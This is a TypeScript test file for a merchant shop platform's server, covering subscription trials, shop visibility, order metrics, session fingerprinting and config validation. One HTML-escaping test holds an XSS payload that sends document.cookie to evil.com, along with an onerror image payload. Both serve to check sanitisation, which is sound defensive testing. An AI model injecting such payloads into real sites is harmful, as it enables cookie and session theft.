import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { dbGet, dbRun } from '../db.ts';
import { canPublishShop, canReceiveShopOrders, getSubscriptionReminderAt, getSubscriptionReminderDaysBefore, isShopPubliclyVisible, isSubscriptionReminderDue } from '../server/services/businessRules.ts';
import {
  isBlockedStaticAsset,
  buildSessionFingerprint,
  isRequestFingerprintMatch,
  rotateMerchantAccessTokenForShop,
  getSubscriptionPlanConfig,
  getSubscriptionState,
  normalizeSubscriptionTier,
  escapeHtml,
  sanitizeTextField,
  validateCustomerOrderInput,
  validateRuntimeConfig,
  shouldSeedDemoData,
  getRateLimitClientAddress,
  saveMerchantSessionRecord,
  getMerchantSessionRecord,
  deleteMerchantSessionRecord,
  summarizeOrderMetrics,
} from '../server.ts';
import { TRIAL_DURATION_DAYS } from '../src/utils/subscriptionFeatures.ts';

test('calculates the merchant trial state on the server', () => {
  const now = new Date('2026-09-28T12:00:00.000Z');
  const trialEnd = '2026-10-05T12:00:00.000Z';
  const state = getSubscriptionState({
    subscription_status: 'trialing',
    trial_start: '2026-09-28T12:00:00.000Z',
    trial_end: trialEnd,
  }, now);

  assert.equal(state.status, 'trialing');
  assert.equal(state.trialDaysRemaining, TRIAL_DURATION_DAYS);
  assert.equal(state.isActive, true);
  const expiredState = getSubscriptionState({ ...state, subscription_status: 'trialing', trial_end: trialEnd }, new Date('2026-10-06T12:00:00.000Z'));
  assert.equal(expiredState.trialDaysRemaining, 0);
  assert.equal(expiredState.status, 'past_due');
  assert.equal(expiredState.isActive, false);
});

test('subscriptions enter grace after expiry and schedule reminders at J-14, J-7, J-3 and J-1', () => {
  const trial = {
    subscription_status: 'trialing',
    trial_start: '2026-09-03T10:00:00.000Z',
    trial_end: '2026-10-03',
    selected_subscription_tier: 'standard',
  } as const;
  const lastTrialDay = getSubscriptionState(trial, new Date('2026-10-03T23:59:00.000Z'));
  const nextDay = getSubscriptionState(trial, new Date('2026-10-04T00:00:00.000Z'));
  assert.equal(lastTrialDay.status, 'trialing');
  assert.equal(lastTrialDay.trialDaysRemaining, 1);
  assert.equal(nextDay.status, 'past_due');
  assert.equal(nextDay.trialDaysRemaining, 0);
  assert.equal(getSubscriptionReminderDaysBefore(trial, new Date('2026-10-01T00:00:00.000Z')), null);
  assert.equal(getSubscriptionReminderDaysBefore(trial, new Date('2026-10-02T00:00:00.000Z')), 1);
  assert.equal(getSubscriptionReminderAt(trial, new Date('2026-10-01T00:00:00.000Z'))?.toISOString(), '2026-10-02T00:00:00.000Z');
  assert.equal(isSubscriptionReminderDue(trial, new Date('2026-10-01T00:00:00.000Z')), false);
  assert.equal(isSubscriptionReminderDue(trial, new Date('2026-10-02T00:00:00.000Z')), true);
  assert.equal(isSubscriptionReminderDue(trial, new Date('2026-10-04T00:00:00.000Z')), false);
  const reminderSchedule = { ...trial, trial_end: '2026-10-15' };
  assert.equal(getSubscriptionReminderDaysBefore(reminderSchedule, new Date('2026-10-01T00:00:00.000Z')), 14);
  assert.equal(getSubscriptionReminderDaysBefore(reminderSchedule, new Date('2026-10-08T00:00:00.000Z')), 7);
  assert.equal(getSubscriptionReminderDaysBefore(reminderSchedule, new Date('2026-10-12T00:00:00.000Z')), 3);
  assert.equal(getSubscriptionReminderDaysBefore(reminderSchedule, new Date('2026-10-14T00:00:00.000Z')), 1);

  const paid = { ...trial, subscription_status: 'active', trial_end: null, subscription_expires_at: '2026-10-03T12:00:00.000Z' };
  assert.equal(getSubscriptionState(paid, new Date('2026-10-03T23:59:00.000Z')).status, 'active');
  assert.equal(getSubscriptionState(paid, new Date('2026-10-04T00:00:00.000Z')).status, 'past_due');
  assert.equal(getSubscriptionState(paid, new Date('2026-10-06T00:00:00.000Z')).status, 'suspended');
});

test('publication eligibility is independent from the shop opening toggle', () => {
  const currentDate = new Date('2026-10-01T12:00:00.000Z');
  const shop = {
    id: 1,
    is_active: true,
    is_open: false,
    publication_status: 'active',
    merchant_verification_status: 'verified',
    subscription_status: 'trialing',
    trial_start: '2026-10-01T00:00:00.000Z',
    trial_end: '2026-10-31T00:00:00.000Z',
    opening_hours: { enabled: false, open_time: '08:00', close_time: '22:00' },
  } as any;

  assert.equal(canPublishShop(shop, currentDate), true);
  assert.equal(canPublishShop({ ...shop, publication_status: 'draft' }, currentDate), true);
  assert.equal(isShopPubliclyVisible(shop, currentDate), true);
  assert.equal(canReceiveShopOrders(shop, currentDate), false);
  assert.equal(canReceiveShopOrders({ ...shop, is_open: true }, currentDate), true);
});

test('a Didit-verified shop stays visible during payment grace but cannot bypass suspension', () => {
  const currentDate = new Date('2026-10-01T12:00:00.000Z');
  const shop = {
    id: 2,
    is_active: true,
    is_open: true,
    publication_status: 'active',
    merchant_verification_status: 'verified',
    subscription_status: 'trialing',
    trial_start: '2026-10-01T00:00:00.000Z',
    trial_end: '2026-10-31T00:00:00.000Z',
  } as any;

  assert.equal(isShopPubliclyVisible({ ...shop, publication_status: 'draft' }, currentDate), false);
  assert.equal(isShopPubliclyVisible({ ...shop, publication_status: 'suspended' }, currentDate), false);
  assert.equal(isShopPubliclyVisible({ ...shop, merchant_verification_status: 'pending' }, currentDate), false);
  const pastDue = { ...shop, subscription_status: 'past_due', trial_end: '2026-09-30T00:00:00.000Z' };
  assert.equal(isShopPubliclyVisible(pastDue, currentDate), true);
  assert.equal(canReceiveShopOrders(pastDue, currentDate), true);
  assert.equal(isShopPubliclyVisible({ ...shop, is_active: false }, currentDate), false);
});

test('excludes cancelled and expired order values while preserving received counts', () => {
  const orders = [
    { id: 1, shop_id: 8, total_amount: 15000, created_at: '2026-09-19T08:00:00.000Z', status: 'pending' },
    { id: 2, shop_id: 8, total_amount: 24000, created_at: '2026-09-19T09:30:00.000Z', status: 'confirmed' },
    { id: 3, shop_id: 8, total_amount: 33000, created_at: '2026-09-19T10:00:00.000Z', status: 'delivered' },
    { id: 4, shop_id: 8, total_amount: 22000, created_at: '2026-09-19T11:00:00.000Z', status: 'cancelled' },
    { id: 5, shop_id: 8, total_amount: 41000, created_at: '2026-09-18T18:00:00.000Z', status: 'delivered' },
    { id: 6, shop_id: 8, total_amount: 19000, created_at: '2026-09-19T12:00:00.000Z', status: 'expired' },
  ] as any[];

  const metrics = summarizeOrderMetrics(orders, 8, new Date('2026-09-19T18:00:00.000Z'));

  assert.equal(metrics.received, 5);
  assert.equal(metrics.confirmed, 1);
  assert.equal(metrics.delivered, 1);
  assert.equal(metrics.cancelled, 1);
  assert.equal(metrics.ca_ordered, 72000);
  assert.equal(metrics.ca_confirmed, 24000);
  assert.equal(metrics.ca_delivered, 33000);
  assert.equal(metrics.panier_moyen_livre, 33000);
});

test('blocks backend bundles and sourcemaps from public static serving', () => {
  assert.equal(isBlockedStaticAsset('/server.cjs'), true);
  assert.equal(isBlockedStaticAsset('/server.cjs.map'), true);
  assert.equal(isBlockedStaticAsset('/assets/index.js'), false);
  assert.equal(isBlockedStaticAsset('/manifest.json'), false);
});

test('binds a merchant session to the current request fingerprint', () => {
  const req = {
    headers: {
      'x-forwarded-for': '203.0.113.42',
      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      'accept-language': 'fr-FR,fr;q=0.9',
    },
    socket: { remoteAddress: '127.0.0.1' },
    ip: '203.0.113.42',
  } as any;

  const fingerprint = buildSessionFingerprint(req);
  assert.equal(isRequestFingerprintMatch({ fingerprint }, req), true);
  assert.equal(isRequestFingerprintMatch({ fingerprint: 'different-fingerprint' }, req), false);
});

test('ignores spoofed x-forwarded-for values when binding a session fingerprint', () => {
  const firstReq = {
    headers: {
      'x-forwarded-for': '203.0.113.42',
      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      'accept-language': 'fr-FR,fr;q=0.9',
    },
    socket: { remoteAddress: '127.0.0.1' },
    ip: '203.0.113.42',
  } as any;

  const secondReq = {
    headers: {
      'x-forwarded-for': '8.8.8.8',
      'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      'accept-language': 'fr-FR,fr;q=0.9',
    },
    socket: { remoteAddress: '127.0.0.1' },
    ip: '203.0.113.42',
  } as any;

  assert.equal(buildSessionFingerprint(firstReq), buildSessionFingerprint(secondReq));
  assert.equal(isRequestFingerprintMatch({ fingerprint: buildSessionFingerprint(firstReq) }, secondReq), true);
});

test('uses the Express-resolved client IP for public rate limits behind trusted proxies', () => {
  assert.equal(getRateLimitClientAddress({
    ip: '203.0.113.42',
    socket: { remoteAddress: '10.0.0.10' },
  } as any), '203.0.113.42');
  assert.equal(getRateLimitClientAddress({
    ip: undefined,
    socket: { remoteAddress: '10.0.0.10' },
  } as any), '10.0.0.10');
});

test('keeps a merchant session valid when the client IP changes', () => {
  const firstReq = {
    headers: {
      'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
      'accept-language': 'fr-FR,fr;q=0.9',
    },
    socket: { remoteAddress: '10.0.0.10' },
    ip: '10.0.0.10',
  } as any;
  const secondReq = {
    ...firstReq,
    socket: { remoteAddress: '10.0.0.11' },
    ip: '10.0.0.11',
  } as any;

  assert.equal(isRequestFingerprintMatch({ fingerprint: buildSessionFingerprint(firstReq) }, secondReq), true);
});

test('persists merchant session records through the configured database adapter', async () => {
  const token = 'restart-session-test-token';
  const session = {
    shopId: 42,
    expiresAt: Date.now() + 60 * 60 * 1000,
    fingerprint: 'session-fingerprint-v1',
  };

  await saveMerchantSessionRecord(token, session);
  assert.deepEqual(await getMerchantSessionRecord(token), session);
  const storedTokenHash = createHash('sha256').update(`matable-session:${token}`).digest('hex');
  assert.ok(await dbGet('SELECT token FROM merchant_sessions WHERE token = ?', [storedTokenHash]));
  assert.equal(await dbGet('SELECT token FROM merchant_sessions WHERE token = ?', [token]), undefined);

  await deleteMerchantSessionRecord(token);
  assert.equal(await getMerchantSessionRecord(token), null);
});

test('rotates the merchant access token when an admin renews access', async () => {
  const shopId = Date.now();
  const oldToken = 'old-token-123';
  await dbRun(
    `INSERT INTO shops (id, name, slug, whatsapp_number, pin_code_hash, created_at, category, subscription_tier, owner_access_token_hash)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [shopId, 'Rotation test', `rotation-test-${shopId}`, `225${String(shopId).slice(-10)}`, 'test-pin-hash', new Date().toISOString(), 'other', 'standard', createHash('sha256').update(oldToken).digest('hex')],
  );

  try {
    const newToken = await rotateMerchantAccessTokenForShop(shopId, oldToken);
    assert.ok(newToken);
    assert.notEqual(newToken, oldToken);
    assert.equal(newToken.length > 10, true);
    const storedToken = await dbGet<{ owner_access_token_hash: string }>('SELECT owner_access_token_hash FROM shops WHERE id = ?', [shopId]);
    assert.equal(storedToken?.owner_access_token_hash, createHash('sha256').update(newToken).digest('hex'));
  } finally {
    await dbRun('DELETE FROM shops WHERE id = ?', [shopId]);
  }
});

test('exposes the documented monthly subscription plan catalog', () => {
  assert.deepEqual(getSubscriptionPlanConfig('standard'), {
    tier: 'standard',
    amount: 3000,
    label: 'Standard',
    description: 'Les essentiels pour présenter vos produits et recevoir des demandes.',
  });
  assert.equal(getSubscriptionPlanConfig('premium').amount, 5000);
  assert.equal(getSubscriptionPlanConfig('pro').amount, 8000);
});

test('normalizes unknown subscription tiers to standard', () => {
  assert.equal(normalizeSubscriptionTier('standard'), 'standard');
  assert.equal(normalizeSubscriptionTier('premium'), 'premium');
  assert.equal(normalizeSubscriptionTier('pro'), 'pro');
  assert.equal(normalizeSubscriptionTier(undefined), 'standard');
});

test('escapes HTML in merchant-controlled shop metadata before rendering', () => {
  const rawTitle = 'Ma Boutique"></title><script>fetch("https://evil.com/?c="+document.cookie)</script>';
  const rawMessage = 'Bonjour <img src=x onerror=alert(1)>';

  assert.equal(escapeHtml(rawTitle), 'Ma Boutique&quot;&gt;&lt;/title&gt;&lt;script&gt;fetch(&quot;https://evil.com/?c=&quot;+document.cookie)&lt;/script&gt;');
  assert.equal(sanitizeTextField(rawMessage, 80), 'Bonjour');
});

test('rejects malformed or oversized order customer data', () => {
  const invalidPhone = validateCustomerOrderInput({
    customer_name: 'A',
    customer_phone: '123',
    delivery_location: 'Lieu',
    delivery_note: 'x'.repeat(600),
  });

  const valid = validateCustomerOrderInput({
    customer_name: 'Alice Dupont',
    customer_phone: '+2250708091011',
    delivery_location: 'Cocody Riviera 3',
    delivery_note: 'Bonjour',
  });

  assert.equal(invalidPhone.ok, false);
  assert.equal(valid.ok, true);
  assert.equal(valid.customer_phone, '+2250708091011');
});

test('skips demo data seeding in production unless explicitly enabled', () => {
  const previous = {
    NODE_ENV: process.env.NODE_ENV,
    DEMO_MODE: process.env.DEMO_MODE,
  };

  try {
    process.env.NODE_ENV = 'production';
    delete process.env.DEMO_MODE;
    assert.equal(shouldSeedDemoData(), false);

    process.env.DEMO_MODE = 'true';
    assert.equal(shouldSeedDemoData(), true);
  } finally {
    if (previous.NODE_ENV === undefined) delete process.env.NODE_ENV; else process.env.NODE_ENV = previous.NODE_ENV;
    if (previous.DEMO_MODE === undefined) delete process.env.DEMO_MODE; else process.env.DEMO_MODE = previous.DEMO_MODE;
  }
});
test('rejects placeholder production app URLs', () => {
  const previous = {
    NODE_ENV: process.env.NODE_ENV,
    DATABASE_URL: process.env.DATABASE_URL,
    ADMIN_ACCESS_KEY: process.env.ADMIN_ACCESS_KEY,
    VERIFICATION_ADMIN_ACCESS_KEY: process.env.VERIFICATION_ADMIN_ACCESS_KEY,
    APP_URL: process.env.APP_URL,
    PORT: process.env.PORT,
    MATABLE_DB_PATH: process.env.MATABLE_DB_PATH,
  };

  try {
    process.env.NODE_ENV = 'production';
    process.env.DATABASE_URL = 'postgresql://matable:strongpass@ep-demo.us-east-1.aws.neon.tech/matable';
    process.env.ADMIN_ACCESS_KEY = 'production-admin-access-key-2026-strong';
    process.env.VERIFICATION_ADMIN_ACCESS_KEY = 'production-verification-key-2026-strong';
    process.env.APP_URL = 'https://example.com';
    process.env.PORT = '3000';
    process.env.MATABLE_DB_PATH = './data/matable.db';

    assert.throws(() => validateRuntimeConfig(), /APP_URL.*example/i);
  } finally {
    if (previous.NODE_ENV === undefined) delete process.env.NODE_ENV; else process.env.NODE_ENV = previous.NODE_ENV;
    if (previous.DATABASE_URL === undefined) delete process.env.DATABASE_URL; else process.env.DATABASE_URL = previous.DATABASE_URL;
    if (previous.ADMIN_ACCESS_KEY === undefined) delete process.env.ADMIN_ACCESS_KEY; else process.env.ADMIN_ACCESS_KEY = previous.ADMIN_ACCESS_KEY;
    if (previous.VERIFICATION_ADMIN_ACCESS_KEY === undefined) delete process.env.VERIFICATION_ADMIN_ACCESS_KEY; else process.env.VERIFICATION_ADMIN_ACCESS_KEY = previous.VERIFICATION_ADMIN_ACCESS_KEY;
    if (previous.APP_URL === undefined) delete process.env.APP_URL; else process.env.APP_URL = previous.APP_URL;
    if (previous.PORT === undefined) delete process.env.PORT; else process.env.PORT = previous.PORT;
    if (previous.MATABLE_DB_PATH === undefined) delete process.env.MATABLE_DB_PATH; else process.env.MATABLE_DB_PATH = previous.MATABLE_DB_PATH;
  }
});
test('rejects unsafe production configuration', () => {
  const previous = {
    NODE_ENV: process.env.NODE_ENV,
    DATABASE_URL: process.env.DATABASE_URL,
    ADMIN_ACCESS_KEY: process.env.ADMIN_ACCESS_KEY,
    VERIFICATION_ADMIN_ACCESS_KEY: process.env.VERIFICATION_ADMIN_ACCESS_KEY,
    APP_URL: process.env.APP_URL,
    PORT: process.env.PORT,
    MATABLE_DB_PATH: process.env.MATABLE_DB_PATH,
  };

  try {
    process.env.NODE_ENV = 'production';
    process.env.DATABASE_URL = 'postgresql://matable:strongpass@ep-demo.us-east-1.aws.neon.tech/matable';
    process.env.ADMIN_ACCESS_KEY = 'production-admin-access-key-2026-strong';
    process.env.VERIFICATION_ADMIN_ACCESS_KEY = 'production-verification-key-2026-strong';
    process.env.APP_URL = 'https://matable.ci';
    process.env.PORT = '3000';
    process.env.MATABLE_DB_PATH = './data/matable.db';
    process.env.ADMIN_ACCESS_KEY = 'legacy-admin-key';
    assert.throws(() => validateRuntimeConfig(), /ADMIN_ACCESS_KEY.*32 caractères/i);

    process.env.ADMIN_ACCESS_KEY = 'production-admin-access-key-2026-strong';
    process.env.APP_URL = 'not-a-valid-url';
    assert.throws(() => validateRuntimeConfig(), /APP_URL.*URL publique/i);

    process.env.APP_URL = 'https://matable.ci';
    process.env.PORT = '0';
    assert.throws(() => validateRuntimeConfig(), /PORT .* 1 et 65535|PORT doit être/i);
  } finally {
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) {
        delete process.env[key];
      } else {
        process.env[key] = value;
      }
    }
  }
});
